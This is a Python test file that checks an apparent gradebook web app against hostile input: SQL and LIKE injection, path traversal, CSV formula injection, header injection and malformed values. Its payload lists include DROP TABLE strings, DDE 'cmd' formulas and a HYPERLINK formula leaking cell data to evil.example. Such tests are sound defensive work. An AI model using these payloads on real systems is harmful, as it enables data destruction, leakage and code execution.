"""Hostile input: SQL/LIKE injection, CSV formula injection, oversize/odd values, unicode and control characters."""

import csv
import io
import unicodedata

import pytest
from sqlalchemy import text

from superteacher import reports
from tests.sec_util import H, build, login, seed_class

SQLI = [
    "' OR '1'='1",
    "'; DROP TABLE students; --",
    '" OR ""="',
    "1; DELETE FROM students",
    "' UNION SELECT id, name FROM courses --",
    "\\",
    "%",
    "_",
    "%' --",
    "\\' OR 1=1 --",
    "x' AND (SELECT COUNT(*) FROM students) > 0 --",
    "Robert'); DROP TABLE students;--",
]


@pytest.fixture
def api():
    with build(raise_server_exceptions=False) as c:
        assert login(c).status_code == 200
        c.ids = seed_class(c, students=("Ada Lovelace", "100% Sure", "snake_case", "O'Brien"))
        yield c


def tables_intact(c):
    with c.app.state.session_factory() as db:
        n = db.execute(text("SELECT COUNT(*) FROM students")).scalar()
        courses = db.execute(text("SELECT COUNT(*) FROM courses")).scalar()
    return n, courses


# ── SQL / LIKE ──────────────────────────────────────────────────────────
@pytest.mark.parametrize("payload", SQLI)
def test_search_and_filters_are_parameterised(api, payload):
    for params in ({"q": payload}, {"course_id": payload}, {"section_id": payload}, {"q": payload, "risk": "at_risk"}):
        r = api.get("/api/students", params=params)
        assert r.status_code in (200, 422), params
    assert api.get("/api/overview", params={"section_id": payload}).status_code == 200
    assert tables_intact(api) == (4, 1)


def test_like_wildcards_are_literal_in_search(api):
    names = lambda q: sorted(s["name"] for s in api.get("/api/students", params={"q": q}).json())  # noqa: E731
    assert names("%") == ["100% Sure"]
    assert names("_") == ["snake_case"]
    assert names("\\") == []
    assert names("100%") == ["100% Sure"]
    assert names("o'brien") == ["O'Brien"]
    assert names("%%") == []
    assert len(names("")) == 4


@pytest.mark.parametrize("payload", [*SQLI, "../../etc/passwd", "a" * 5000, "%00", "‮", "😀"])
def test_hostile_ids_in_paths_are_404_never_500(api, payload):
    sid = api.ids["students"][0]
    enc = payload.replace("/", "%2F").replace("#", "%23").replace("?", "%3F").replace("%00", "%00")
    paths = [
        ("GET", f"/api/students/{enc}", None),
        ("GET", f"/api/students/{enc}/insight", None),
        ("DELETE", f"/api/students/{enc}", None),
        ("PATCH", f"/api/students/{enc}", {"grade_level": 9}),
        ("POST", f"/api/students/{enc}/notes", {"body": "x"}),
        ("GET", f"/api/sections/{enc}/gradebook", None),
        ("GET", f"/api/sections/{enc}/attendance", None),
        ("PUT", f"/api/assessments/{enc}/scores", {"scores": []}),
        ("DELETE", f"/api/assessments/{enc}", None),
        ("GET", f"/api/reports/sections/{enc}/gradebook.csv", None),
        ("GET", f"/api/reports/sections/{enc}/summary", None),
        ("POST", f"/api/reports/students/{enc}/parent-update", {"tone": "warm"}),
    ]
    for method, path, body in paths:
        r = api.request(method, path, json=body, headers=H)
        assert r.status_code in (404, 405, 422), (method, path[:60], r.status_code)
        assert "Traceback" not in r.text and "sqlalchemy" not in r.text.lower()
    assert api.get(f"/api/students/{sid}").status_code == 200  # nothing was deleted by the attempts


@pytest.mark.parametrize("payload", SQLI)
def test_injection_strings_in_bodies_are_stored_as_inert_text(api, payload):
    sid = api.ids["section"]
    r = api.post("/api/courses", json={"name": payload + "x"}, headers=H)
    assert r.status_code == 201 and r.json()["name"] == (payload + "x").strip()
    assert (
        api.post(
            "/api/sections", json={"course_id": api.ids["course"], "name": payload[:50] + "s"}, headers=H
        ).status_code
        == 201
    )
    st = api.post("/api/students", json={"name": payload[:100] + "z", "grade_level": 9, "section_id": sid}, headers=H)
    assert st.status_code == 201
    assert api.post(f"/api/students/{st.json()['id']}/notes", json={"body": payload}, headers=H).status_code == 201
    assert api.post(f"/api/sections/{sid}/assessments", json={"title": payload}, headers=H).status_code == 201
    assert tables_intact(api)[0] >= 5


def test_ids_in_bodies_are_validated_not_trusted(api):
    assert (
        api.post(
            "/api/students", json={"name": "A", "grade_level": 9, "section_id": "' OR 1=1 --"}, headers=H
        ).status_code
        == 404
    )
    assert api.post("/api/sections", json={"course_id": "x' --", "name": "S"}, headers=H).status_code == 404
    a = api.post(f"/api/sections/{api.ids['section']}/assessments", json={"title": "T"}, headers=H).json()[
        "assessments"
    ][0]
    r = api.put(
        f"/api/assessments/{a['id']}/scores", json={"scores": [{"student_id": "x' OR 1=1", "points": 5}]}, headers=H
    )
    assert r.status_code == 422
    r = api.put(
        f"/api/sections/{api.ids['section']}/attendance",
        json={"marks": [{"student_id": "x", "status": "present"}]},
        headers=H,
    )
    assert r.status_code == 422


def test_cross_section_student_cannot_be_graded_through_another_section(api):
    other = seed_class(api, course="Other", section="P9", students=("Eve Outsider",))
    a = api.post(f"/api/sections/{api.ids['section']}/assessments", json={"title": "T"}, headers=H).json()[
        "assessments"
    ][0]
    r = api.put(
        f"/api/assessments/{a['id']}/scores",
        json={"scores": [{"student_id": other["students"][0], "points": 1}]},
        headers=H,
    )
    assert r.status_code == 422
    r = api.put(
        f"/api/sections/{api.ids['section']}/attendance",
        json={"marks": [{"student_id": other["students"][0], "status": "absent"}]},
        headers=H,
    )
    assert r.status_code == 422


def test_patch_cannot_mass_assign_protected_fields(api):
    sid = api.ids["students"][0]
    r = api.patch(
        f"/api/students/{sid}", json={"id": "hacked", "name": "Renamed", "average": 100, "risk": "on_track"}, headers=H
    )
    assert r.status_code == 200 and r.json()["id"] == sid and r.json()["name"] == "Renamed"
    assert api.get("/api/students/hacked").status_code == 404


# ── CSV formula injection (export) ──────────────────────────────────────
TRIGGERS = ["=", "+", "-", "@", "\t", "\r", "\n"]
FORMULAS = [
    '=HYPERLINK("http://evil.example/?"&A1,"x")',
    "+cmd|' /C calc'!A0",
    "-2+3",
    "@SUM(1+1)",
    "=1+1",
    "\t=1+1",
    "\r=1+1",
    "\n=1+1",
    " =1+1",
    "\uff1d1+1",  # full-width look-alikes
    "\uff0b1",
    "\uff0d1",
    "\uff20SUM(1)",
    "=cmd|'/c calc'!A1",
]


def parse_csv(resp) -> list[list[str]]:
    return list(csv.reader(io.StringIO(resp.text.lstrip("﻿"))))


def dangerous(cell: str) -> bool:
    return cell.lstrip()[:1] in set("=+-@\t\r\n\uff1d\uff0b\uff0d\uff20")


@pytest.mark.parametrize("formula", FORMULAS)
def test_export_neutralises_formulas_in_every_text_cell(api, formula):
    sec = api.ids["section"]
    # student names reach the CSV two ways: the API and the CSV importer (which collapses whitespace itself)
    imp = api.post(f"/api/sections/{sec}/import", json={"csv": f'"{formula}",9\n'}, headers=H)
    assert imp.status_code == 200
    api.post(f"/api/sections/{sec}/assessments", json={"title": formula or "x"}, headers=H)
    r = api.get(f"/api/reports/sections/{sec}/gradebook.csv")
    assert r.status_code == 200
    rows = parse_csv(r)
    cells = [c for row in rows for c in row]
    assert not [c for c in cells if dangerous(c)], [c for c in cells if dangerous(c)]


def test_formula_names_created_via_api_are_neutralised(api):
    sec = api.ids["section"]
    for f in ["=1+1", "+1", "-1", "@x", "\t=1", "\r=1"]:
        r = api.post("/api/students", json={"name": f, "grade_level": 9, "section_id": sec}, headers=H)
        if r.status_code == 201:  # leading whitespace is stripped by validation; the rest must be quoted on export
            pass
    cells = [c for row in parse_csv(api.get(f"/api/reports/sections/{sec}/gradebook.csv")) for c in row]
    assert not [c for c in cells if dangerous(c)]


@pytest.mark.parametrize("value", [None, 5, 5.5, "", "plain", "a=b", "x+y"])
def test_csv_safe_keeps_harmless_values(value):
    out = reports.csv_safe(value)
    assert out == ("" if value is None else value)


def test_csv_export_download_headers_and_filename_are_safe(api):
    c2 = api.post("/api/courses", json={"name": 'Evil"; filename=x.exe Set-Cookie: a=b'}, headers=H).json()
    s2 = api.post("/api/sections", json={"course_id": c2["id"], "name": "../../x\\y"}, headers=H).json()
    r = api.get(f"/api/reports/sections/{s2['id']}/gradebook.csv")
    cd = r.headers["content-disposition"]
    assert (
        "\r" not in cd and "\n" not in cd and cd.count('"') == 2 and ".." not in cd and "/" not in cd and "\\" not in cd
    )
    assert "set-cookie" not in r.headers
    assert r.headers["content-type"].startswith("text/csv") and r.headers["cache-control"] == "no-store"
    assert r.headers["x-content-type-options"] == "nosniff"


# ── CSV import ──────────────────────────────────────────────────────────
def imp(c, body: str):
    return c.post(f"/api/sections/{c.ids['section']}/import", json={"csv": body}, headers=H)


def test_import_skips_bad_rows_and_never_500s(api):
    body = "\n".join(
        [
            "name,grade_level",
            "Good Kid,9",
            "Bad Grade,13",
            "Zero,0",
            "Letters,abc",
            f"Longname{'x' * 200},9",
            ",9",
            "  ,  ",
            "Float,9.5",
            "Huge," + "9" * 5000,
            "Neg,-3",
            'Quote"d,9',
            '"Multi\nLine",9',
            "Tab\tName,9",
            "ok\x00null,9",
            "ok\x01ctl,9",
        ]
    )
    r = imp(api, body)
    assert r.status_code == 200, r.text
    names = {s["name"] for s in api.get("/api/students").json()}
    assert "Good Kid" in names and "Bad Grade" not in names and "Zero" not in names
    assert not [n for n in names if any(unicodedata.category(ch) == "Cc" for ch in n)], names
    assert all(len(n) <= 120 for n in names)


def test_import_limits(api):
    assert imp(api, "A,9\n" * 5001).status_code == 422
    assert imp(api, "x" * 500_001).status_code == 422
    assert imp(api, "A,9\r\n" * 10).status_code == 200
    assert imp(api, "").json() == {"created": 0, "skipped": []}
    assert imp(api, "﻿name,grade\nBOM Kid,9").json()["created"] == 1


def test_import_survives_malformed_csv(api):
    assert imp(api, '"unterminated,9\nNext,9').status_code in (200, 422)
    assert imp(api, "a" * 200_000 + ",9").status_code in (200, 422)  # csv field size limit is 131072
    assert tables_intact(api)[0] >= 4


def test_unicode_normalisation_duplicates_are_refused(api):
    nfc, nfd = "Zoë Smith", "Zoë Smith"
    assert nfc != nfd and unicodedata.normalize("NFC", nfd) == nfc
    assert imp(api, f"{nfc},9").json()["created"] == 1
    res = imp(api, f"{nfd},9").json()
    assert res["created"] == 0 and "already" in res["skipped"][0]
    # and through the JSON API
    assert (
        api.post(
            "/api/students", json={"name": nfd, "grade_level": 9, "section_id": api.ids["section"]}, headers=H
        ).json()["name"]
        == nfc
    )


def test_non_ascii_case_folding_duplicates_for_courses_and_sections(api):
    assert api.post("/api/courses", json={"name": "Ångström Lab"}, headers=H).status_code == 201
    assert api.post("/api/courses", json={"name": "ÅNGSTRÖM LAB"}, headers=H).status_code == 409
    assert api.post("/api/courses", json={"name": "Ångström Lab"}, headers=H).status_code == 409
    nfd = unicodedata.normalize("NFD", "Ångström Lab")
    assert api.post("/api/courses", json={"name": nfd}, headers=H).status_code == 409


# ── odd values ──────────────────────────────────────────────────────────
BAD_JSON_STRINGS = [r"a\u0000b", r"a\u001bb", r"\u0085", r"a\u007fb", r"tab\there", r"nl\nhere"]


@pytest.mark.parametrize("bad", BAD_JSON_STRINGS)
def test_control_chars_and_lone_surrogates_rejected_in_names(api, bad):
    sec = api.ids["section"]
    hdr = {**H, "content-type": "application/json"}
    assert api.post("/api/courses", content=f'{{"name": "{bad}"}}', headers=hdr).status_code == 422
    body = f'{{"name":"{bad}","grade_level":9,"section_id":"{sec}"}}'
    assert api.post("/api/students", content=body, headers=hdr).status_code == 422


def test_lone_surrogates_in_text_fields_never_crash_the_database_driver(api):
    sec = api.ids["section"]
    hdr = {**H, "content-type": "application/json"}
    r = api.post("/api/courses", content=r'{"name": "a\ud800b"}', headers=hdr)
    assert r.status_code in (201, 422)  # sanitised or refused, but never a 500
    r = api.post(
        "/api/students",
        content=r'{"name":"Zed\udfff","grade_level":9,"section_id":"SEC"}'.replace("SEC", sec),
        headers=hdr,
    )
    assert r.status_code in (201, 422)
    # ids and CSV text are free-form strings that reach SQL parameters too
    assert api.post(
        "/api/students", content=r'{"name":"A","grade_level":9,"section_id":"\ud800"}', headers=hdr
    ).status_code in (404, 422)
    assert api.post(f"/api/sections/{sec}/import", content=r'{"csv":"Lone \ud800,9"}', headers=hdr).status_code == 200


def test_notes_may_be_multiline_but_not_contain_nul(api):
    sid = api.ids["students"][0]
    assert api.post(f"/api/students/{sid}/notes", json={"body": "line1\nline2\ttabbed"}, headers=H).status_code == 201
    assert api.post(f"/api/students/{sid}/notes", json={"body": "bad\x00note"}, headers=H).status_code == 422
    assert api.post(f"/api/students/{sid}/notes", json={"body": "x" * 2001}, headers=H).status_code == 422
    assert api.post(f"/api/students/{sid}/notes", json={"body": "   "}, headers=H).status_code == 422


NUMBER_BODIES = [
    '{"title":"t","max_points":NaN}',
    '{"title":"t","max_points":Infinity}',
    '{"title":"t","max_points":-Infinity}',
    '{"title":"t","max_points":1e999}',
    '{"title":"t","max_points":0}',
    '{"title":"t","max_points":-5}',
    '{"title":"t","max_points":1000001}',
    '{"title":"t","max_points":"NaN"}',
    '{"title":"t","max_points":"inf"}',
    '{"title":"t","max_points":[1]}',
    '{"title":"t","due_date":"0000-00-00"}',
    '{"title":"t","due_date":"2024-02-30"}',
    '{"title":"t","kind":"exam; drop"}',
]


@pytest.mark.parametrize("body", NUMBER_BODIES)
def test_assessment_numbers_and_dates_validated(api, body):
    r = api.post(
        f"/api/sections/{api.ids['section']}/assessments",
        content=body,
        headers={**H, "content-type": "application/json"},
    )
    assert r.status_code == 422, (body, r.text[:200])
    assert "Traceback" not in r.text


@pytest.mark.parametrize(
    "pts", ["NaN", "Infinity", "-Infinity", "-1", "1e999", "-0.0001", '"abc"', "1e308", "151", "[]", "{}"]
)
def test_score_values_validated(api, pts):
    a = api.post(
        f"/api/sections/{api.ids['section']}/assessments", json={"title": "T", "max_points": 100}, headers=H
    ).json()["assessments"][0]
    sid = api.ids["students"][0]
    r = api.put(
        f"/api/assessments/{a['id']}/scores",
        content=f'{{"scores":[{{"student_id":"{sid}","points":{pts}}}]}}',
        headers={**H, "content-type": "application/json"},
    )
    assert r.status_code == 422, (pts, r.status_code)
    gb = api.get(f"/api/sections/{api.ids['section']}/gradebook").json()
    assert all(v is None for row in gb["rows"] for v in row["points"].values())  # nothing was stored


def test_batch_and_field_size_caps(api):
    sec, sid = api.ids["section"], api.ids["students"][0]
    a = api.post(f"/api/sections/{sec}/assessments", json={"title": "T"}, headers=H).json()["assessments"][0]
    many = [{"student_id": sid, "points": 1}] * 1001
    assert api.put(f"/api/assessments/{a['id']}/scores", json={"scores": many}, headers=H).status_code == 422
    marks = [{"student_id": sid, "status": "present"}] * 1001
    assert api.put(f"/api/sections/{sec}/attendance", json={"marks": marks}, headers=H).status_code == 422
    assert api.post("/api/courses", json={"name": "x" * 121}, headers=H).status_code == 422
    assert (
        api.post("/api/sections", json={"course_id": api.ids["course"], "name": "x" * 61}, headers=H).status_code == 422
    )
    assert api.get("/api/students", params={"q": "x" * 121}).status_code == 422
    for g in (0, 13, -1, 10**30, 9.5, "9; DROP"):
        r = api.post("/api/students", json={"name": "G", "grade_level": g, "section_id": sec}, headers=H)
        assert r.status_code == 422, g


def test_wrong_content_types_and_shapes_are_422_not_500(api):
    for content, ctype in [
        ("name=x", "application/x-www-form-urlencoded"),
        ("<a/>", "text/xml"),
        ("null", "application/json"),
        ("[]", "application/json"),
        ('"str"', "application/json"),
        ("", "application/json"),
    ]:
        r = api.post("/api/courses", content=content, headers={**H, "content-type": ctype})
        assert r.status_code in (400, 415, 422), (ctype, content, r.status_code)


def test_nesting_and_size_do_not_crash_the_server(api):
    shallow = '{"name":' + "[" * 200 + "]" * 200 + "}"
    assert (
        api.post("/api/courses", content=shallow, headers={**H, "content-type": "application/json"}).status_code == 422
    )
    big = '{"name": "' + "x" * 3_000_000 + '"}'
    assert api.post("/api/courses", content=big, headers={**H, "content-type": "application/json"}).status_code == 422
    assert api.get("/api/overview").status_code == 200  # still serving afterwards


def test_very_deeply_nested_json_is_a_4xx(api):
    deep = '{"name":' + "[" * 5000 + "]" * 5000 + "}"
    assert api.post("/api/courses", content=deep, headers={**H, "content-type": "application/json"}).status_code < 500


def test_ai_tool_arguments_are_bounded_and_validated(api):
    from superteacher import ai_tools

    with api.app.state.session_factory() as db:
        for args in (
            {"limit": 10**9},
            {"limit": -1},
            {"limit": 0},
            {"min_average": float("nan")},
            {"max_average": float("inf"), "limit": 3},
            {"section": "x" * 1000},
            {"name_contains": "%' OR 1=1 --"},
            {"sort_by": "name; DROP TABLE students"},
            {"risk": "bogus"},
            "not a dict",
            None,
            {"limit": True},
        ):
            try:
                out = ai_tools.execute(db, "find_students", args)
            except ai_tools.ToolError:
                continue
            assert len(out) <= ai_tools.MAX_TOOL_RESULT_CHARS + 20
        assert '"returned":' in ai_tools.execute(db, "find_students", {"limit": 10**9})
        with pytest.raises(ai_tools.ToolError):
            ai_tools.execute(db, "drop_everything", {})
    assert tables_intact(api)[0] == 4


def test_surrogate_in_a_numeric_field_is_a_422(api):
    r = api.post(
        "/api/students",
        content=r'{"name":"A","grade_level":"\ud800","section_id":"x"}',
        headers={**H, "content-type": "application/json"},
    )
    assert r.status_code == 422
